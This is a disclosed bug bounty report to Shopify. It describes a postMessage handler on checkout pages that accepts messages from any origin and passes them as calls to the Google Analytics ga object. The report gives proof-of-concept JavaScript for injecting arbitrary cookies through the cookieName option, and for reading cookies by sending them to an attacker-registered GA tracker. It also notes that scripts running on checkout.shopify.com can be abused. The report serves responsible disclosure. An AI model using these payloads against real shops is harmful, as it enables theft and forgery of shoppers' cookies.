# Read/Write arbitrary (non-HttpOnly) cookies on checkout pages via GoogleAnalyticsAdditionalScripts postMessage handler

## Report Details
- **Report ID**: 1081167
- **URL**: https://hackerone.com/reports/1081167
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-19T04:11:06.281Z
- **Disclosed**: 2022-12-01T19:34:31.286Z

## Reporter
- **Username**: bored-engineer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
# Background
Shopify shops can be configured with a [Google Analytics integration](https://help.shopify.com/en/manual/reports-and-analytics/google-analytics) within the admin settings for a shop (`/admin/online_store/preferences`).
This is a deeper integration than simply including `analytics.js` via a liquid template, for example [ecommerce tracking](https://help.shopify.com/en/manual/reports-and-analytics/google-analytics/google-analytics-setup#basic) can be enabled.
Within this functionality "Additional Google Analytics JavaScript" can be specified which can reference the (global) `ga` object, ex:
```js
ga('linker:autoLink', ['bored.engineer']);
```
During checkout (of a cart), an edge-case occurs: Some functionality is hosted on `checkout.shopify.com` (such as address/payment forms) that the shop owner may wish to fire Google Analytics events for.
To resolve this, a `postMessage` based proxy is configured where the `checkout.shopify.com` pages execute the "Additional Google Analytics JavaScript" and any calls to the `ga` function (really an event queue) are pushed to the primary shop domain to be fired.

# Summary
The `postMessage` handler on the shop domain does not validate the `event.origin` before processing events.
This can allow a malicious webpage to send messages which eventually result in function calls on the `ga` object.
It is then possible to write arbitrary cookies values (via `document.cookie` injection) which can often lead to other security concerns.
Additionally, it is possible to register an additional (attacker controlled) GA tracker, then leverage the [linkid plugin](https://developers.google.com/analytics/devguides/collection/analyticsjs/enhanced-link-attribution) to read any cookie value.
This is only exploitable on shops that have a configured Google Analytics integration (not default, but common).

# Vulnerability
The vulnerability is pretty straight-forward, exploitation is the more difficult part. 
```js
// From checkout-b0ace6cd81eb816d383ce78462bdcd5cfc3cfef0055b9ff774fd9de732b3d9d2.js
function r(e) {
  "analytics" === e.data.type && ("undefined" == typeof n.calls && (n.calls = []),
  n.calls = n.calls.concat(e.data.calls),
  document.body.dispatchEvent(new CustomEvent("GoogleAnalyticsEvent")))
}
// [snip]
window.addEventListener("message", r)
// [snip]
[{
    key: "executeAdditionalScripts",
    value: function n() {
        var e = t.calls;
        void 0 !== e && (e.forEach(function(e) {
            var t;
            (t = window).ga.apply(t, C(e))
        }),
        t.calls = [])
    }
}]
// From checkout HTML page
document.body.addEventListener("GoogleAnalyticsEvent", function() {
  window.GoogleAnalyticsAdditionalScripts.executeAdditionalScripts()
});
```
The vulnerability can be demonstrated as easily as sending an event like this:
```js
var win = window.open("https://bored-engineering-whitehat-2.myshopify.com/20276739/checkouts/0f446f1d92e2d55bb576273ebb3fc89c")
setTimeout(function() {
  win.frames[0].postMessage({
    "type": "analytics",
    "calls": [
      ['send', 'pageview']
    ]
  }, "*")
}, 2000)
```
Which will trigger a pageview event (in the network tab):
{F1163231}

# Google Analytics APIs
We now have a primitive for executing any function with any arugments on the `ga` object.
I spent a while trying to turn this into XSS, I'm reasonably confident it is not possible.

# Plugin Loading (dead-end, mostly)
Google Analytics supports [plugins](https://developers.google.com/analytics/devguides/collection/analyticsjs/using-plugins) via a "require" command, ex:
```js
ga('require', 'linkid');
```
This also supports custom plugins via a ["provide" command](https://developers.google.com/analytics/devguides/collection/analyticsjs/command-queue-reference#provide):
```js
function MyPlugin(tracker, options) {
  // ...
}
ga('provide', 'myplugin', MyPlugin);
```
While this seems like an easy path to XSS (register ["eval"](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) as a plugin, then call it), we are limited by the [structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm) which does not allow functions to be serialized.
Attempting to provide a string such as `"eval"` will not be allowed by GA as it checks the type of the input ensure it is a `function`:
```js
var ea = function(a) {
  return "function" == typeof a
}
// [snip]
a = a[2];
// [snip]
if (this.g && (!qa(b) || "" == b || !ea(a)))
  throw "abort";
```
However, this is still useful as we can load additional plugins from Google as long as they are in a pre-defined allowlist:
```js
Zd = {
  ec: 45,
  ecommerce: 46,
  linkid: 47
};
// [snip]
y = function(a, b, c, d, e) {
  if (!ea(Yd.get(b)) && !$d.get(b)) {
     Zd.hasOwnProperty(b) && J(Zd[b]);
```

## Registering an additional tracker
One of the problems that comes with using or abusing any of the Google Analytics functions is the registered tracker is not attacker controlled. Fortunately, GA allows registering [multiple trackers](https://developers.google.com/analytics/devguides/collection/analyticsjs/creating-trackers) via the `"create"` method, ex:
```js
ga("create", {
	"name": "pwn",
	"trackingId": "UA-44361710-4"
})
ga("pwn.send", "pageview")
```
This will allow any exploits that require to exfiltrating data via Google Analytics.

## Setting cookie values
Leveraging the `create` method, it is possible to set arbitrary cookie values.
This is possible because Google Analytics allows customization in the name of the cookie used (`_ga` by default) via the `cookieName` attribute, ex:
```js
ga("create", {
	"name": "pwn",
	"trackingId": "UA-44361710-4",
	"cookieName": "_custom_ga"
})
```
Internally, this is implemented via string concatenation into a `document.cookie` call, manually prettified below:
```js
zc = function(cookieName, cookieValue, cookiePath, cookieDomain, trackingId, cookieExpire, cookieFlags) {
	// Check if the user is opt'd out, bail early
    optOut = userIsOptedOut(trackingId) ? false : /(^|\.)doubleclick\.net$/i.test(document.location.hostname) || "/" == cookiePath && /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/.test(cookieDomain) ? false : true;
    if (!optOut)
        return false;
    // Truncate the value past 1200 characters
    cookieValue && 1200 < cookieValue.length && (cookieValue = cookieValue.substring(0, 1200));
    // Build the cookie name
    cookie = cookieName + "=" + cookieValue + "; path=" + cookiePath + "; ";
    // If expiration was specified, add "expires" flag
    cookieExpire && (cookiePath += "expires=" + (new Date((new Date).getTime() + cookieExpire)).toGMTString() + "; ");
    // If cookieDomain set, add "domain" flag
    cookieDomain && "none" !== cookieDomain && (cookiePath += "domain=" + cookieDomain + ";");
    // Add any additional cookieFlags
    cookieFlags && (cookiePath += cookieFlags + ";");
    // Set the value
    changed = document.cookie;
    document.cookie = cookie;
    if (!(changed = changed != document.cookie))
        label: {
            value = getCookie(cookieName);
            for (idx = 0; idx < value.length; idx++)
                if (cookieValue == value[idx]) {
                    changed = true;
                    break label
                }
            changed = false
        }
    return changed
}
```
There is no escaping provided before the `document.cookie = cookie` call which means a malicious `cookieName` can be used to set a cookie, ex:
```js
ga("create", {
	"name": "pwn",
	"trackingId": "UA-44361710-4",
	"cookieName": "injectedCookie=value;"
})
// [snip]
document.cookie = "injectedCookie=value;=GA1.3.614842418.1609270420; path=/; expires=Thu, 19 Jan 2023 03:18:11 GMT; domain=bored-engineering-whitehat-2.myshopify.com;"
```
Browsers will ignore unknown flags during calls to `document.cookie` essentially resulting in the following call:
```js
document.cookie = "injectedCookie=value;"
```
This can be re-used multiple times by modifying the `name` of the tracker and repeating the call.
(warning: speculation) for many sites this can be used in combination with other security issues (ex: setting a CSRF cookie) that implicitly trust cookie values.

## Reading cookie values
Google Analytics has a optional [Enhanced Link Attribution](https://developers.google.com/analytics/devguides/collection/analyticsjs/enhanced-link-attribution) plugin which allows tracking which element was clicked leading to a page load.
To accomplish this element IDs are saved in a `_gali` cookie which is then read by Google Analytics and emitted as part of page loads.
The name of this cookie is customizable via a `cookieName` property, ex:
```
ga('require', 'linkid', {
  'cookieName': 'pwn',
});
ga('send', 'pageview');
```
This will result in the value of the `pwn` cookie (assuming it is readable) being included in the Google Analytics payloads making it (eventually) accessible from the GA console:
{F1163232}


# P.S. (self?) "XSS" on checkout.shopify.com
I wanted to note one other component of this (the original reason this proxy exists) is the ability to execute arbitrary JavaScript on `checkout.shopify.com` via the "Additional Google Analytics JavaScript" setting.
This is the [checkout.shopify.com/$shop_id$/sandbox/google_analytics_iframe](https://checkout.shopify.com/20276739/sandbox/google_analytics_iframe) page:
```js
window.additionalScripts = function() {
    // JS controlled by the attacker 
};
// [snip]
{
  key: "receiveMessage",
  value: function o(e) {
    if (e.source === window.parent && "checkout_context" === e.data.type) {
      this.origin = e.origin, window.Shopify = e.data.Shopify, window.__st = e.data.__st;
      try {
        window.additionalScripts()
      } catch (t) {
        console.error("User script error: ", t)
      }
    }
  }
}
// [snip]
var t = this;
window.addEventListener("message", function(e) {
  return t.receiveMessage(e)
}, !1)
```
This is essentially (intentional) XSS by design on the `checkout.shopify.com` domain (an attacker can iframe this page and trigger the `"checkout_context"` postMessage).
I'm not sure if this is intended functionality (it kinda has to be to make this integration work) but it results in an potential malicous actor executing JS on the same domain that handles the payment integrations (but not direct credit card numbers), address auto-complete, etc.
It is possible in somewhat contrived/high user interaction scenarios (ex: the attacker opens the initial shop page) to utilize this XSS to intercept address fields or other integration details via `win.frames[<index]` following `var win = window.open(...)`.
Let me know if you're interested in some PoCs for that or more details.

## Impact

See description for details.

## Attachments
- Screen_Shot_2021-01-18_at_8.03.34_PM.png
- Screen_Shot_2021-01-18_at_7.31.07_PM.png
